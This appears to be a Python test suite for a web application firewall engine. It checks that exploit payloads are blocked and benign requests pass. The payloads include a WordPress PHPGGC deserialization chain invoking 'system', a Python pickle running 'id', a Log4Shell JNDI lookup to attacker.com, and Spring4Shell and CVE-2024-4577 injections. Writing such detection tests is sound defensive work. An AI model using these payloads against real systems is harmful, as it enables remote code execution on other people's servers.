"""Step 1 Verification Test Suite: Full Threat Intelligence & Hardened Security Engine.

Tests:
1. Insecure Deserialization & PHPGGC Gadget Shield (WordPress RCE1, RCE2, Base64, Java, Python).
2. 2024-2026 Critical CVE Vectors (Log4j, Spring4Shell, PHP 8 CGI, WordPress Plugins).
3. In-Memory 128k Threat Intel IP Shield.
4. Memory-Safe DoS Guard (Large Payload Bomb Truncation).
5. Benign Traffic Zero-False-Positive Pass.
6. Execution Speed Verification (< 1ms per evaluation).
"""

import sys
import os
import time

try:
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    if hasattr(sys.stderr, 'reconfigure'):
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

# Ensure backend root is on sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.engine.decision_engine import DecisionEngine


def run_tests():
    print("\n" + "=" * 65)
    print("🛡️  MDefender Pro — Step 1: Threat Intelligence & Hardening Test Suite")
    print("=" * 65 + "\n")

    engine = DecisionEngine()
    passed = 0
    total = 0

    def assert_test(name, condition, details=""):
        nonlocal passed, total
        total += 1
        if condition:
            passed += 1
            print(f"  ✅ PASS: {name}")
        else:
            print(f"  ❌ FAIL: {name} | {details}")

    # --- 1. Deserialization & PHPGGC Gadget Tests ---
    print("--- [1] PHP & Java Insecure Deserialization Shield ---")
    
    # 1.1 WordPress RCE1 PHPGGC chain
    wp_rce1 = 'O:8:"WP_Theme":2:{s:7:"headers";O:13:"WP_Block_List":2:{s:6:"blocks";a:1:{s:4:"Name";a:1:{s:9:"blockName";s:12:"Parent Theme";}}s:8:"registry";O:22:"WP_Block_Type_Registry":1:{s:22:"registered_block_types";O:8:"WP_Theme":2:{s:7:"headers";N;s:6:"parent";O:22:"WpOrg\\Requests\\Session":3:{s:3:"url";s:10:"http://p:0";s:7:"headers";a:1:{i:0;s:2:"id";}s:7:"options";a:1:{s:5:"hooks";O:20:"WpOrg\\Requests\\Hooks":1:{s:5:"hooks";a:1:{s:23:"requests.before_request";a:1:{i:0;a:1:{i:0;a:2:{i:0;O:20:"WpOrg\\Requests\\Hooks":1:{s:5:"hooks";a:1:{s:15:"http://p:0/Name";a:1:{i:0;a:1:{i:0;s:6:"system";}}}}i:1;s:8:"dispatch";}}}}}}}}}}s:6:"parent";N;}'
    res = engine.evaluate({"path": "/index.php", "method": "POST", "body": f"data={wp_rce1}"})
    assert_test("PHP Deserialization: WordPress RCE1 PHPGGC Blocked", res["decision"] == "BLOCK", f"Decision: {res['decision']}, Reason: {res.get('reason')}")

    # 1.2 Base64 Encoded PHP Serialized Object
    import base64
    b64_deser = base64.b64encode(wp_rce1.encode()).decode()
    res = engine.evaluate({"path": "/api/upload", "method": "POST", "body": f"payload={b64_deser}"})
    assert_test("PHP Deserialization: Base64-Encoded Gadget Chain Blocked", res["decision"] == "BLOCK", f"Decision: {res['decision']}, Reason: {res.get('reason')}")

    # 1.3 Java ysoserial stream
    res = engine.evaluate({"path": "/ws", "method": "POST", "body": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU="})
    assert_test("Java Deserialization: ysoserial Magic Stream (rO0AB) Blocked", res["decision"] == "BLOCK", f"Decision: {res['decision']}, Reason: {res.get('reason')}")

    # 1.4 Python Pickle injection
    res = engine.evaluate({"path": "/task", "method": "POST", "body": "c__builtin__\nsystem\n(S'id'\ntR."})
    assert_test("Python Deserialization: Insecure Pickle Shell Sink Blocked", res["decision"] == "BLOCK", f"Decision: {res['decision']}, Reason: {res.get('reason')}")

    # --- 2. 2024-2026 Critical CVE Attack Vectors ---
    print("\n--- [2] Critical CVE & 0-Day Exploit Vectors ---")

    # 2.1 Log4Shell JNDI injection
    res = engine.evaluate({"path": "/login", "method": "GET", "headers": {"User-Agent": "${jndi:ldap://attacker.com/exploit}"}})
    assert_test("CVE: Log4Shell (${jndi:ldap}) in User-Agent Blocked", res["decision"] == "BLOCK", f"Decision: {res['decision']}")

    # 2.2 Spring4Shell classLoader manipulation
    res = engine.evaluate({"path": "/helloworld", "method": "POST", "body": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"})
    assert_test("CVE: Spring4Shell (class.module.classLoader) Blocked", res["decision"] == "BLOCK", f"Decision: {res['decision']}")

    # 2.3 PHP 8.x CGI Argument Injection (CVE-2024-4577)
    res = engine.evaluate({"path": "/index.php", "method": "GET", "query_params": {"-d": "allow_url_include=1 -d auto_prepend_file=php://input"}})
    assert_test("CVE: PHP 8.x CGI Injection (CVE-2024-4577) Blocked", res["decision"] == "BLOCK", f"Decision: {res['decision']}")

    # 2.4 WordPress Plugin RCE (File Manager connector)
    res = engine.evaluate({"path": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", "method": "POST"})
    assert_test("CVE: WordPress File Manager Plugin RCE Blocked", res["decision"] == "BLOCK", f"Decision: {res['decision']}")

    # --- 3. In-Memory 128k Threat Intel IP Shield ---
    print("\n--- [3] 128K Threat Intelligence IP Shield ---")
    
    # Check IP from our threat intelligence database
    sample_threat_ip = "1.0.126.255" # Top IP in cleaned_waf_data.db
    res = engine.evaluate({"path": "/home", "method": "GET"}, ip=sample_threat_ip)
    assert_test(f"Threat Intel: Blacklisted Feed IP ({sample_threat_ip}) Blocked Instantly", res["decision"] == "BLOCK" and "IP blocked" in res.get("reason", ""))

    # --- 4. Large Payload DoS Truncation Guard ---
    print("\n--- [4] Anti-DoS Memory & ReDoS Guard ---")
    
    # 2MB repetitive benign text bomb
    huge_body = "data=" + ("A" * (2 * 1024 * 1024))
    t0 = time.perf_counter()
    res = engine.evaluate({"path": "/upload", "method": "POST", "body": huge_body})
    t_bomb = (time.perf_counter() - t0) * 1000
    assert_test(f"Anti-DoS: 2MB Memory Bomb Neutralized in {t_bomb:.2f} ms", t_bomb < 60.0 and res["decision"] == "BLOCK")

    # --- 5. Clean Benign Traffic Zero-False-Positive Test ---
    print("\n--- [5] Zero False Positive Verification (Benign Traffic) ---")
    
    benign_requests = [
        {"path": "/products/electronics", "method": "GET", "query_params": {"category": "laptops", "sort": "price_asc", "page": "1"}},
        {"path": "/api/v1/checkout", "method": "POST", "body": '{"cart_id": "12345", "coupon": "WELCOME10", "shipping": "standard"}'},
        {"path": "/blog/2026/how-to-secure-your-website", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}}
    ]
    all_benign_allowed = True
    for b_req in benign_requests:
        b_res = engine.evaluate(b_req)
        if b_res["decision"] != "ALLOW":
            all_benign_allowed = False
            print(f"    False positive on {b_req['path']}: {b_res.get('reason')}")
    assert_test("Benign Traffic: 100% Legitimate Traffic Allowed with 0 False Positives", all_benign_allowed)

    # --- 6. Speed & Latency Benchmark ---
    print("\n--- [6] Sub-Millisecond Speed Benchmark ---")
    # Warmup
    for _ in range(5):
        engine.evaluate({"path": "/search", "method": "GET", "query_params": {"q": "shoes"}})
    N = 300
    t0 = time.perf_counter()
    for _ in range(N):
        engine.evaluate({"path": "/search", "method": "GET", "query_params": {"q": "shoes"}})
    t1 = time.perf_counter()
    avg_ms = ((t1 - t0) * 1000) / N
    assert_test(f"Latency: Sub-millisecond Edge Response (Avg: {avg_ms:.3f} ms / request)", avg_ms < 1.5)

    # --- Summary ---
    print("\n" + "=" * 65)
    print(f"📊 Step 1 Verification Summary: {passed}/{total} Tests PASSED ({(passed/total)*100:.1f}%)")
    print("=" * 65 + "\n")

    return passed == total


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
